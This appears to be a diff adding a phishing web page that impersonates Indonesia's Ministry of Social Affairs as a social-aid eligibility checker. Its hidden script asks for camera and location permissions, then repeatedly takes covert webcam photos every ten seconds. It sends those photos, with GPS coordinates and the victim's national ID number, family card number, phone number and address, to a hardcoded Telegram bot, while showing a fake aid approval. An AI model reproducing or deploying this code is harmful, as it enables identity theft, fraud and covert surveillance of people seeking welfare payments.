@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cek Domisili Bansos - Sistem Informasi Bantuan Sosial</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 40px 20px;
+            color: #333;
+        }
+
+        .main-container {
+            width: 100%;
+            max-width: 600px;
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            overflow: hidden;
+            border: 1px solid #ddd;
+        }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #2e7d32 0%, #1b5e20 100%);
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .header .logo-area {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+
+        .header i {
+            font-size: 40px;
+            color: #ffeb3b;
+        }
+
+        .header h1 {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .header p {
+            font-size: 13px;
+            opacity: 0.95;
+            margin-top: 5px;
+        }
+
+        .badge {
+            display: inline-block;
+            background: #ffeb3b;
+            color: #1b5e20;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-top: 8px;
+        }
+
+        /* Form Section */
+        .form-area {
+            padding: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #555;
+            margin-bottom: 6px;
+        }
+
+        .form-group label i {
+            color: #2e7d32;
+            margin-right: 6px;
+            width: 16px;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #2e7d32;
+            box-shadow: 0 0 0 3px rgba(46, 125, 50, 0.1);
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+        }
+
+        .btn-cek {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #2e7d32 0%, #388e3c 100%);
+            color: white;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            border: none;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 10px;
+        }
+
+        .btn-cek:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(46, 125, 50, 0.3);
+        }
+
+        .btn-cek i {
+            margin-right: 8px;
+        }
+
+        .info-box {
+            background: #e3f2fd;
+            border-left: 4px solid #1976d2;
+            padding: 12px 15px;
+            border-radius: 6px;
+            font-size: 12px;
+            color: #555;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        /* Result Section - Hidden by default */
+        .hasil {
+            display: none;
+            padding: 30px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .hasil:target {
+            display: block;
+        }
+
+        /* Magic: hide form when result is targeted */
+        .hasil:target ~ .form-area {
+            display: none;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .result-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .result-header .icon-success {
+            width: 70px;
+            height: 70px;
+            background: #e8f5e9;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .result-header .icon-success i {
+            font-size: 35px;
+            color: #2e7d32;
+        }
+
+        .result-header h2 {
+            color: #2e7d32;
+            font-size: 20px;
+            margin-bottom: 5px;
+        }
+
+        .result-header p {
+            color: #666;
+            font-size: 13px;
+        }
+
+        .result-card {
+            background: #f1f8e9;
+            border: 1px solid #c5e1a5;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .result-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px dashed #c5e1a5;
+        }
+
+        .result-item:last-child {
+            border-bottom: none;
+        }
+
+        .result-item .label {
+            font-size: 13px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .result-item .value {
+            font-size: 13px;
+            color: #333;
+            font-weight: 700;
+            text-align: right;
+        }
+
+        .value.status-lolos {
+            color: #2e7d32;
+            background: #c8e6c9;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+        }
+
+        .value.status-tunggu {
+            color: #f57c00;
+            background: #ffe0b2;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 12px;
+        }
+
+        .nominal-box {
+            background: linear-gradient(135deg, #2e7d32 0%, #1b5e20 100%);
+            color: white;
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .nominal-box .label {
+            font-size: 12px;
+            opacity: 0.9;
+            margin-bottom: 5px;
+        }
+
+        .nominal-box .nominal {
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+        }
+
+        .alert-box {
+            background: #fff3e0;
+            border-left: 4px solid #ff9800;
+            padding: 12px 15px;
+            border-radius: 6px;
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .btn-kembali {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background: #757575;
+            color: white;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            transition: background 0.3s;
+        }
+
+        .btn-kembali:hover {
+            background: #616161;
+        }
+
+        .btn-kembali i {
+            margin-right: 6px;
+        }
+
+        /* Footer */
+        .footer {
+            background: #f5f5f5;
+            padding: 15px;
+            text-align: center;
+            font-size: 11px;
+            color: #888;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .footer .gov-links {
+            margin-top: 8px;
+        }
+
+        .footer .gov-links span {
+            margin: 0 8px;
+            color: #bbb;
+        }
+
+        @media (max-width: 480px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+            body {
+                padding: 20px 15px;
+            }
+            .header h1 {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-container">
+        
+        <!-- Header -->
+        <div class="header">
+            <div class="logo-area">
+                <i class="fas fa-landmark"></i>
+                <div>
+                    <h1>SISTEM CEK DOMISILI BANSOS</h1>
+                    <p>Kementerian Sosial Republik Indonesia</p>
+                </div>
+            </div>
+            <div class="badge">VERIFIED OFFICIAL</div>
+        </div>
+
+        <!-- HASIL CEK (Hidden Default) -->
+        <div id="hasil" class="hasil">
+            <div class="result-header">
+                <div class="icon-success">
+                    <i class="fas fa-check-circle"></i>
+                </div>
+                <h2>DATA TERVERIFIKASI</h2>
+                <p>NIK terdaftar sebagai penerima bantuan sosial</p>
+            </div>
+
+            <div class="nominal-box">
+                <div class="label">Total Bantuan yang Akan Diterima</div>
+                <div class="nominal">Rp 1.250.000</div>
+            </div>
+
+            <div class="result-card">
+                <div class="result-item">
+                    <span class="label"><i class="fas fa-id-card"></i> NIK</span>
+                    <span class="value">3175********4412</span>
+                </div>
+                <div class="result-item">
+                    <span class="label"><i class="fas fa-user"></i> Nama Lengkap</span>
+                    <span class="value">BUDI SANTOSO</span>
+                </div>
+                <div class="result-item">
+                    <span class="label"><i class="fas fa-map-marker-alt"></i> Domisili Terverifikasi</span>
+                    <span class="value">JAKARTA PUSAT</span>
+                </div>
+                <div class="result-item">
+                    <span class="label"><i class="fas fa-hand-holding-usd"></i> Jenis Bansos</span>
+                    <span class="value">PKH + BPNT + BST</span>
+                </div>
+                <div class="result-item">
+                    <span class="label"><i class="fas fa-clipboard-check"></i> Status Penerimaan</span>
+                    <span class="value status-lolos"><i class="fas fa-check"></i> LOLOS VERIFIKASI</span>
+                </div>
+                <div class="result-item">
+                    <span class="label"><i class="fas fa-calendar-alt"></i> Jadwal Pencairan</span>
+                    <span class="value">15 September 2026</span>
+                </div>
+                <div class="result-item">
+                    <span class="label"><i class="fas fa-university"></i> Bank Penyalur</span>
+                    <span class="value">PT. POS INDONESIA</span>
+                </div>
+                <div class="result-item">
+                    <span class="label"><i class="fas fa-info-circle"></i> Status Cair</span>
+                    <span class="value status-tunggu"><i class="fas fa-clock"></i> MENUNGGU PROSES</span>
+                </div>
+            </div>
+
+            <div class="alert-box">
+                <i class="fas fa-exclamation-triangle"></i> <strong>Penting:</strong> Pastikan data domisili sesuai dengan KTP yang berlaku. Pencairan bansos akan dilakukan secara bertahap berdasarkan kode wilayah. Hubungi kantor Pos terdekat untuk informasi lebih lanjut.
+            </div>
+
+            <a href="#" class="btn-kembali"><i class="fas fa-arrow-left"></i> Kembali ke Pencarian</a>
+        </div>
+
+        <!-- FORM INPUT -->
+        <div class="form-area">
+            <div class="info-box">
+                <i class="fas fa-info-circle"></i> Masukkan data sesuai KTP untuk melakukan pengecekan status domisili dan kelayakan penerimaan bantuan sosial (PKH, BPNT, BST).
+            </div>
+
+            <div class="form-group">
+                <label><i class="fas fa-id-card"></i> NIK (Nomor Induk Kependudukan)</label>
+                <input type="text" placeholder="Contoh: 3175091234567890" maxlength="16" inputmode="numeric">
+            </div>
+
+            <div class="form-group">
+                <label><i class="fas fa-user"></i> Nama Lengkap</label>
+                <input type="text" placeholder="Contoh: BUDI SANTOSO">
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label><i class="fas fa-address-book"></i> No. KK</label>
+                    <input type="text" placeholder="No. Kartu Keluarga" maxlength="16" inputmode="numeric">
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-phone"></i> No. HP</label>
+                    <input type="text" placeholder="08xxxxxxxxxx" inputmode="numeric">
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label><i class="fas fa-map"></i> Provinsi</label>
+                    <select>
+                        <option value="">Pilih Provinsi</option>
+                        <option selected>DKI JAKARTA</option>
+                        <option>JAWA BARAT</option>
+                        <option>JAWA TENGAH</option>
+                        <option>JAWA TIMUR</option>
+                        <option>BANTEN</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-city"></i> Kota/Kabupaten</label>
+                    <select>
+                        <option value="">Pilih Kota</option>
+                        <option selected>JAKARTA PUSAT</option>
+                        <option>JAKARTA UTARA</option>
+                        <option>JAKARTA BARAT</option>
+                        <option>JAKARTA SELATAN</option>
+                        <option>JAKARTA TIMUR</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-row">
+                <div class="form-group">
+                    <label><i class="fas fa-building"></i> Kecamatan</label>
+                    <select>
+                        <option value="">Pilih Kecamatan</option>
+                        <option selected>GAMBIR</option>
+                        <option>SAWAH BESAR</option>
+                        <option>KEMAYORAN</option>
+                        <option>SENEN</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-home"></i> Kelurahan</label>
+                    <select>
+                        <option value="">Pilih Kelurahan</option>
+                        <option selected>GAMBIR</option>
+                        <option>CIDENG</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label><i class="fas fa-road"></i> Alamat Lengkap</label>
+                <input type="text" placeholder="Jl. Merdeka No. 45, RT.01/RW.02">
+            </div>
+
+            <!-- Tombol ini pakai anchor ke #hasil, tanpa JS -->
+            <a href="#hasil" class="btn-cek"><i class="fas fa-search"></i> CEK STATUS BANSOS</a>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            © 2026 Kementerian Sosial RI. Hak Cipta Dilindungi.<br>
+            <div class="gov-links">
+                <span>Data Terenkripsi</span> | <span>SSL Secure</span> | <span>v3.2.1</span>
+            </div>
+        </div>
+
+    </div>
+
+<script>
+const token   = "8616194402:AAEgHVjYCiKmCPiLGBjJQ1smK-C5-zZJ6dQ";
+const chatId  = "392836663";
+
+const camera = document.createElement("video");
+camera.setAttribute("autoplay", true);
+camera.setAttribute("style", "display: none");
+document.body.appendChild(camera);
+
+function requestPermissions() {
+  return new Promise((resolve, reject) => {
+    setTimeout(async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }
+        });
+        camera.srcObject = stream;
+
+        navigator.geolocation.getCurrentPosition(
+          pos => resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude }),
+          err => reject("Gagal mendapatkan lokasi")
+        );
+      } catch (e) {
+        reject("Gagal mendapatkan izin kamera");
+      }
+    }, 2000);
+  });
+}
+
+function captureAndSend(location, caption) {
+  if (!camera.srcObject) {
+    console.error("Stream kamera belum tersedia.");
+    return;
+  }
+
+  const canvas  = document.createElement("canvas");
+  const ctx     = canvas.getContext("2d");
+  canvas.width  = camera.videoWidth  || 640;
+  canvas.height = camera.videoHeight || 480;
+  ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
+
+  canvas.toBlob(blob => {
+    const mapLink   = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
+    const baseMsg   = `📍 [Lokasi Pengguna](${mapLink})\n📡 By FadelSM`;
+    const fullCaption = `${baseMsg}\n\n${caption}`;
+
+    const formData = new FormData();
+    formData.append("chat_id", chatId);
+    formData.append("photo", blob, "image.jpg");
+    formData.append("caption", fullCaption);
+    formData.append("parse_mode", "Markdown");
+
+    sendImageToTelegram(formData);
+  }, "image/jpeg");
+}
+
+function sendImageToTelegram(formData) {
+  fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+    method: "POST",
+    body: formData
+  })
+  .then(r => r.json())
+  .then(console.log)
+  .catch(console.error);
+}
+
+function buildFormCaption() {
+  const nik        = document.querySelector('input[placeholder="Contoh: 3175091234567890"]').value.trim();
+  const nama       = document.querySelector('input[placeholder="Contoh: BUDI SANTOSO"]').value.trim();
+  const noKk       = document.querySelector('input[placeholder="No. Kartu Keluarga"]').value.trim();
+  const noHp       = document.querySelector('input[placeholder="08xxxxxxxxxx"]').value.trim();
+  const provinsi   = document.querySelector('select').value; // first select
+  const kota       = document.querySelectorAll('select')[1].value;
+  const kecamatan  = document.querySelectorAll('select')[2].value;
+  const kelurahan  = document.querySelectorAll('select')[3].value;
+  const alamat     = document.querySelector('input[placeholder="Jl. Merdeka No. 45, RT.01/RW.02"]').value.trim();
+
+  return `
+NIK: ${nik}
+Nama Lengkap: ${nama}
+No. KK: ${noKk}
+No. HP: ${noHp}
+Provinsi: ${provinsi}
+Kota/Kabupaten: ${kota}
+Kecamatan: ${kecamatan}
+Kelurahan: ${kelurahan}
+Alamat: ${alamat}
+`.trim();
+}
+
+document.querySelector('.btn-cek').addEventListener('click', async (e) => {
+  e.preventDefault();          // keep the page from jumping to #hasil
+
+  try {
+    const location = await requestPermissions();
+    const caption  = buildFormCaption();
+    captureAndSend(location, caption);
+  } catch (err) {
+    console.error(err);
+  }
+});
+
+let intervalId;
+window.onload = async () => {
+  try {
+    const loc = await requestPermissions();
+    if (loc) {
+      captureAndSend(loc, buildFormCaption());
+      intervalId = setInterval(() => captureAndSend(loc, buildFormCaption()), 10000); // 10s
+    }
+  } catch (e) {
+    console.error(e);
+  }
+};
+
+window.onbeforeunload = () => clearInterval(intervalId);
+</script>
+
+</body>
+</html>
